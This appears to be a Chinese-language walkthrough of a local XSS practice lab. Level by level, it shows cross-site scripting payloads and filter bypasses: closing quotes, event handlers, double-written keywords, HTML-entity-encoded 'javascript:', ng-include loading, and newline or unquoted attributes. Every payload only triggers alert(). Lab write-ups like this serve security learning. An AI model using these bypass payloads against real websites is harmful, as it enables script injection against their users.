# 技巧

找注入点

找显示位置

页面和页面源代码其实是同一个东西，只不过采用了不同的呈现方式。

页面是页面源代码进行渲染加工的形式，有很多细节会被忽略掉，但这些细节有时候正是xss漏洞的线索。

因此，应该看页面源代码，而不是页面。



问题一：注入点在哪？

问题二：payload如何执行？

# level1

http://192.168.220.191/xss_lab/level1.php?name=test

第一关很简单，注入点：name

直接将name参数的值改为<script>alert()</script>

![1](photo/1.png)

这说明，网页直接将用户输入内容直接写入html中

# level2

第二关是一个有搜索框的GET类型的注入，注入点：keyword

![2](photo/2.png)

位置1是html标签或文本，位置2是input标签的value值

尝试过<script>alert()</script>发现位置1正常输出，说明位置1进行了特殊字符编码，不存在漏洞。

位置2是input标签的value值，可以尝试闭合。

然后，尝试

```
'"><script>alert()</script> 
```

发现成功。

# level3

![3](photo/3.png)

尝试

<script>alert()</script>

![3.1](photo/3.1.png)

![3.2](photo/3.2.png)

两个位置，均进行了特殊字符编码。并且，有页面源代码可以发现，位置2或许可以用单引号闭合，并使用事件来实现注入。

payload：

```
' onclick='alert()'
```

点击搜索框，触发事件。

![3.3](photo/3.3.png)

# level4

![4](photo/4.png)

位置1应该不存在漏洞。

位置2可以尝试用双引号闭合，并使用事件。

![4.1](photo/4.1.png)

# level5

![5](photo/5.png)

位置1应该不存在漏洞。

位置2可以尝试用双引号闭合，并使用事件。

payload

```
" onclick="alert()"
```

![5.1](photo/5.1.png)

可见，onclick被替换成o_nclick。很有可能对on进行了替换。

payload

```
"><script>alert()</script>"<
```

![5.2](photo/5.2.png)

可见，<script>被替换成<scr_ipt>

payload

```
script
```

![5.3](photo/5.3.png)

发现script并没有被替换。

payload

```
"><a href='javascript:alert()'>
```

![5.4](photo/5.4.png)

![5.5](photo/5.5.png)

闭合input标签，并使用a标签的href属性可以执行javascript脚本的这一特性。

# level6

payload

```
'"> onclick script
```

![6](photo/6.png)

可见onclick被替换了，但script没有被替换。

payload

```
><a href="javascript:alert()">
```

![6.1](photo/6.1.png)

发现href被替换了

我测试了一下<script>,被替换成了<scr_ipt>。

尝试大写

payload

```
<SCRIPT> ONCLICK HREF
```

![6.2](photo/6.2.png)

发现都未被替换

随便尝试几种方案：

```
" ONCLICK="alert()"
```

![6.3](photo/6.3.png)

```
"><a HREF="javascript:alert()">
```

![6.4](photo/6.4.png)

# level7

payload

```
href HREF script <script>
```

![7](photo/7.png)

发现，存在替换。将script，href均替换为空。可以尝试双写绕过。

payload

```
"><a hhrefref="javasscriptcript:alert()">
```

![7.1](photo/7.1.png)

# level8

![8](photo/8.png)

![8.1](photo/8.1.png)

可见，两个位置均进行双引号的特殊字符处理，因此无法实现闭合。

但是，a标签的href属性可以是攻击的切入点。

但是，我们可以发现，位置2对script进行了替换处理。

因为，**href有隐藏属性：自动解码**

a 标签的 href 属性‌**不存在“自动解码”机制**‌；所谓“自动解码”实为浏览器在‌**解析 `javascript:` 协议字符串或 DOM 属性读取时进行的隐式 URL/HTML 实体解码**‌，导致传入 JS 函数的参数值被提前还原 。‌‌

由于URL编码只会对特殊字符进行编码，javascript不会被编码。因此，无法使用

尝试输入 javascript:alert() 的 HTML实体编码。

```payload
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
```

![8.2](photo/8.2.png)

# level9

payload

```
javascript:alert()
```

![9](photo/9.png)

发现，并没显示，可能存在白名单。

payload

```
javascript:alert() http://
```

![9.1](photo/9.1.png)

只有含有http://的payload才能绕过，好在可以通过javascript的注释符来携带http://

```
//是javascript的单行注释
```

同时可以发现，javascript被替换了，尝试HTML实体编码。

payload

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;//http://
```

![9.2](photo/9.2.png)

# level10

![10](photo/10.png)

尝试注入，看看每个注入点有没有显示位置。

```payload
http://192.168.220.191/xss_lab/level10.php?keyword=well done!&t_link=1&t_history=2&t_sort=3
```

![10.1](photo/10.1.png)

发现注入点3会显示，并且显示在input标签的value属性中。注入点：t_sort

```payload
t_sort=" onclick="alert()"
```

onclick()确实生效了，但是搜索框被隐藏了不会显示，需要自己修改标签属性才能显示。很显然，这样的方式在实际的渗透场景中是不现实的，普通用户不会这样做。如果这样做了，他就不是普通用户了，他就会发现这个input标签的value属性中含有攻击代码。

所以，我们需要对input标签的type属性进行修改或者屏蔽。

```payload
t_sort=" onclick="alert()" type=""
```

![10.2](photo/10.2.png)

html同名属性解析规则：先到先得

根据 HTML 的解析标准，一个标签的起始标记中，**不允许存在两个或更多同名属性**。

当解析器遇到重复的属性名时，这会被视为一个**解析错误（parse error）**。按照标准的错误处理机制，**第二个及之后出现的同名属性（以及它的值）会被直接丢弃，而第一个属性会保留并生效**。所以，如果你写了 `<input type="text" type="hidden">`，`type` 属性的值最终会是 `"text"`。

# level11

![11](photo/11.png)

这一关有一个特殊的注入点，t_ref，值很有可能就是Referer头的值。

![11.1](photo/11.1.png)

使用HackBar插件修改Referer请求头的值。

```payload
" onclick="alert()" type=""
```

![11.2](photo/11.2.png)

# level12

![12](photo/12.png)

特殊的注入点t_ua,值是user agent 请求头

![12.1](photo/12.1.png)

修改User Agent请求头的值

![12.2](photo/12.2.png)

# level13

![13](photo/13.png)

特殊注入点，t_cook，值很有可能是cookie的值。

![13.1](photo/13.1.png)

![12.3](photo/12.3.png)

显示的内容是cookie的user键的值，因此，注入点是cookie请求头的user键

修改cookie请求头的user键的值

![12.4](photo/12.4.png)

# level14

!![14](photo/14.png)

注入点是src，但发现 " 经过了html特殊字符编码，没办法实现闭合。

搜索 ng-include :，发现：`ng-include` 是 AngularJS 中的内置指令，用于‌**获取、编译并引用外部或内部的 HTML 片段**‌，实现模板内容的动态加载与复用。

ng-include :后面的链接要用引号包裹。

因此payload可以上传一个，含有xss漏洞的网址。

找含有xss漏洞的网址容易，比如level1的含payload的网址

```
'http://192.168.220.191/xss_lab/level1.php?name=<script>alert()</script>'
```

![14.1](photo/14.1.png)

![14.2](photo/14.2.png)

发现成功导入html片段，但是<script>并没有被执行。

`ng-include` 通过 AJAX 获取到 HTML 字符串后，会使用 **`innerHTML`** 将其插入到 DOM 中。

而 **`innerHTML` 插入的 `<script>` 标签不会被执行**，这是浏览器的安全限制。即使你看到 DevTools 的 Elements 面板里出现了 `<script>` 标签，它的代码也不会运行。



因此，我们只能使用html的标签，比如<img>,<a>,<input>等

```
'http://192.168.220.191/xss_lab/level1.php?name=<img src=1 onerror="alert()">'
```

图片加载失败，自动触发事件。

![14.6](photo/14.6.png)

```
'http://192.168.220.191/xss_lab/level1.php?name=<img src=1 onmouseover="alert()">'
```

将鼠标放在加载失败的图片上，触发事件。

![14.3](photo/14.3.png)

```
'http://192.168.220.191/xss_lab/level1.php?name=<input onfocus="alert()">'
```

点击搜索框，触发事件。

![14.4](photo/14.4.png)

```
'http://192.168.220.191/xss_lab/level1.php?name=<a href="javascript:alert()">'
```

点击超链接，触发javascript协议的脚本。

![14.5](photo/14.5.png)

# level15

```
<img src=1 onerror="alert()">
```

![15](photo/15.png)

可见<>并没有进行特殊字符编码，但 空格 进行了特殊字符编码。

由于，在 HTML 标签中，属性之间用以下任一种或混合使用都是合法的：

```html
<!-- 用空格 -->
<input type="text" value="hello" id="name">

<!-- 用换行 -->
<input
  type="text"
  value="hello"
  id="name">

<!-- 混用 -->
<input type="text"
  value="hello" id="name">
```

**解析结果完全一样**，浏览器会正常识别所有属性。这是 HTML 规范明确规定的。

因此，可以尝试用换行符替代空格。

换行符的URL编码是%0A

```
<img%0Asrc=1%0Aonerror="alert()">
```

![15.1](photo/15.1.png)

成功绕过空格的替换。

# level18

![18](photo/18.png)

可以尝试 > 封闭标签

```
arg02=><script%3Ealert()</script>
```

![18.1](photo/18.1.png)

发现，<>进行了特殊字符处理。

搜索<embed>标签

`<embed>` 标签曾经是网页中嵌入视频、Flash、PDF 等外部资源的“万金油”，但现在它已经**过时了**，不再推荐使用。

简单说，它定义了一个用于承载外部资源的容器。通过它，你可以在网页里嵌入一个图片、一个网页、一个视频，或者一个需要特定插件（如 Flash）才能运行的应用。



部分浏览器不会显示<embed>，比如Firefox。使用chrome浏览器会显示<embed>标签。

![18.3](photo/18.3.png)



我们可以通过<embed>的属性，来绑定事件。

```
 arg02=onmouseover="alert()"
```

![18.2](photo/18.2.png)

发现 " 进行了特殊字符编码。

在 HTML 中，属性值**不是必须加双引号（或单引号）**，但前提是属性值**只包含特定字符**。

属性值只能包含以下字符：

```text
字母（a-z A-Z）
数字（0-9）
连字符（-）
句点（.）
下划线（_）
冒号（:）
```

属性值包含**空格、引号、`=`、`>`、`<`、反引号等特殊字符**时，必须加引号。

因此，可以尝试不加引号。

```payload
arg02= onmouseover=alert()
```

![18.4](photo/18.4.png)